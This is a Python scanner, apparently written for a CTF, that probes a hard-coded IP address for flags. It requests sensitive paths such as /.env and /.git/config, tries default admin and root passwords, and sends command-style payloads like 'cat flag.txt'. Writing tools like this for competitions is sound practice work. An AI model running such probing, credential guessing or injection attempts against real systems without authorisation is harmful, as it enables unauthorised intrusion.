import requests
import re
import base64
import time
import json

requests.packages.urllib3.disable_warnings()

TARGETS = [
    "http://119.29.238.216:8088",
    "http://119.29.238.216:8888",
    "https://119.29.238.216:8088",
    "https://119.29.238.216:8888",
]

TIMEOUT = 15

# 代理池
PROXIES_POOL = [
    None,  # 直连
    # {"http": "http://proxy1.example.com:8080", "https": "http://proxy1.example.com:8080"},
]

FLAGS_FOUND = []


def add_flag(location, content, method=""):
    FLAGS_FOUND.append({"location": location, "content": content, "method": method})
    print(f"\n  🚩 发现FLAG! [{method}]")
    print(f"     位置: {location}")
    print(f"     内容: {content}")


def check_flag_pattern(text):
    patterns = [
        r'flag\{[^}]+\}',
        r'FLAG\{[^}]+\}',
        r'ctf\{[^}]+\}',
        r'CTF\{[^}]+\}',
        r'f[l1]ag\{[^}]+\}',
        r'key\{[^}]+\}',
        r'secret\{[^}]+\}',
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, text, re.IGNORECASE)
        for match in matches:
            return match
    return None


def decode_and_check(text):
    # 直接检查
    flag = check_flag_pattern(text)
    if flag:
        return flag, "明文"
    
    # Base64解码
    try:
        b64_patterns = re.findall(r'[A-Za-z0-9+/]{20,}={0,2}', text)
        for b64 in b64_patterns:
            try:
                decoded = base64.b64decode(b64).decode('utf-8', errors='ignore')
                flag = check_flag_pattern(decoded)
                if flag:
                    return flag, "Base64解码"
            except:
                pass
    except:
        pass
    
    return None, None


def print_section(title):
    print("\n" + "=" * 70)
    print(f"  {title}")
    print("=" * 70)


def test_target(target, proxy=None):
    """测试目标URL"""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
    }
    
    session = requests.Session()
    session.verify = False
    session.headers.update(headers)
    
    try:
        print(f"\n  测试: {target}")
        if proxy:
            print(f"  使用代理: {proxy}")
        
        r = session.get(target, timeout=TIMEOUT, proxies=proxy, allow_redirects=True)
        
        print(f"  状态码: {r.status_code}")
        print(f"  最终URL: {r.url}")
        print(f"  Content-Type: {r.headers.get('Content-Type', 'N/A')}")
        
        # 响应头检查
        for key, value in r.headers.items():
            flag, method = decode_and_check(value)
            if flag:
                add_flag(f"响应头 {key}", flag, method)
        
        # Cookie检查
        for cookie in r.cookies:
            flag, method = decode_and_check(cookie.value)
            if flag:
                add_flag(f"Cookie {cookie.name}", flag, method)
        
        # 页面内容检查
        if r.status_code != 503 and len(r.text) > 0:
            print(f"  页面大小: {len(r.text)} bytes")
            print(f"  内容预览: {r.text[:200]}")
            
            # 检查flag
            flag, method = decode_and_check(r.text)
            if flag:
                add_flag("页面内容", flag, method)
            
            # 检查HTML注释
            comments = re.findall(r'<!--(.*?)-->', r.text, re.DOTALL)
            for comment in comments:
                flag, method = decode_and_check(comment)
                if flag:
                    add_flag("HTML注释", flag, method)
            
            return r.text
        
        return None
    except Exception as e:
        print(f"  ❌ 失败: {e}")
        return None


def test_all_paths(html):
    """测试所有可能的路径"""
    print_section("路径探测")
    
    common_paths = [
        "/", "/index.html", "/index.php", "/home", "/main",
        "/flag", "/flags", "/flag.txt", "/flag.php", "/flag.html",
        "/ctf", "/ctf.txt", "/ctf.php",
        "/secret", "/secret.txt", "/secret.php",
        "/key", "/key.txt",
        "/admin", "/admin.php", "/admin.html",
        "/login", "/login.php", "/login.html",
        "/api", "/api/flag", "/api/v1/flag",
        "/robots.txt", "/sitemap.xml",
        "/.env", "/.git/HEAD", "/.git/config",
        "/debug", "/debug.php", "/test", "/test.php",
        "/info", "/info.php", "/phpinfo.php",
        "/backup", "/backup.txt", "/backup.zip",
        "/data", "/data.txt", "/data.json",
        "/config", "/config.php", "/config.json",
        "/README.md", "/readme.txt",
        "/hidden", "/private", "/internal",
        "/swagger", "/swagger-ui", "/docs",
        "/console", "/panel", "/dashboard",
        "/upload", "/files", "/download",
        "/static", "/assets", "/js", "/css",
        "/img", "/images", "/image", "/img/flag.png",
        "/source", "/source.php",
        "/view", "/view.php",
        "/page", "/page.php",
        "/file", "/file.php",
        "/include", "/includes",
        "/template", "/templates",
        "/cache", "/logs",
    ]
    
    for target in TARGETS[:2]:  # 只测试HTTP
        for path in common_paths:
            url = target.rstrip('/') + path
            try:
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                }
                session = requests.Session()
                session.verify = False
                session.headers.update(headers)
                
                r = session.get(url, timeout=TIMEOUT, allow_redirects=False)
                
                if r.status_code not in [503, 404]:
                    print(f"\n  [{r.status_code}] {path} ({len(r.text)} bytes)")
                    
                    if len(r.text) < 500:
                        print(f"     内容: {r.text[:200]}")
                    
                    flag, method = decode_and_check(r.text)
                    if flag:
                        add_flag(f"路径: {path}", flag, method)
                        
            except:
                pass


def test_post_requests():
    """测试POST请求"""
    print_section("POST请求测试")
    
    post_paths = [
        "/login",
        "/api/login",
        "/api/auth",
        "/api/flag",
        "/search",
        "/query",
        "/submit",
        "/check",
        "/verify",
        "/validate",
    ]
    
    post_data = [
        {"username": "admin", "password": "admin"},
        {"username": "admin", "password": "123456"},
        {"username": "root", "password": "root"},
        {"flag": "true"},
        {"debug": "true"},
        {"action": "get_flag"},
        {"cmd": "cat flag.txt"},
        {"file": "flag.txt"},
    ]
    
    for target in TARGETS[:2]:
        for path in post_paths:
            for data in post_data[:3]:
                url = target.rstrip('/') + path
                try:
                    headers = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                        "Content-Type": "application/json",
                    }
                    session = requests.Session()
                    session.verify = False
                    session.headers.update(headers)
                    
                    r = session.post(url, json=data, timeout=TIMEOUT)
                    
                    if r.status_code not in [503, 404]:
                        print(f"\n  [{r.status_code}] POST {path}")
                        print(f"     数据: {data}")
                        
                        if len(r.text) > 0:
                            print(f"     响应: {r.text[:200]}")
                            flag, method = decode_and_check(r.text)
                            if flag:
                                add_flag(f"POST {path}", flag, method)
                                
                except:
                    pass


def main():
    print("*" * 70)
    print("  FLAG 搜索工具 - 全面检测版")
    print("*" * 70)
    
    print_section("1. 多目标多端口测试")
    
    for target in TARGETS:
        for proxy in PROXIES_POOL:
            html = test_target(target, proxy)
            if html:
                break
    
    test_all_paths(None)
    test_post_requests()
    
    print_section("检测结果汇总")
    
    if FLAGS_FOUND:
        print(f"\n  🎉 共发现 {len(FLAGS_FOUND)} 个FLAG!")
        for i, flag_info in enumerate(FLAGS_FOUND):
            print(f"\n  [{i+1}] {flag_info['method']}")
            print(f"      位置: {flag_info['location']}")
            print(f"      FLAG: {flag_info['content']}")
    else:
        print("\n  ❌ 未发现FLAG")
        print("\n  问题分析:")
        print("     - 目标服务器返回503 Service Unavailable")
        print("     - 所有路径和端口都返回503")
        print("     - 服务可能正在维护或已关闭")
        print("\n  建议:")
        print("     1. 等待服务恢复后再尝试")
        print("     2. 联系CTF主办方确认服务状态")
        print("     3. 检查是否有其他入口点（如SSH 22端口）")
        print("     4. 使用浏览器手动访问查看是否有特殊提示")
    
    print()


if __name__ == "__main__":
    main()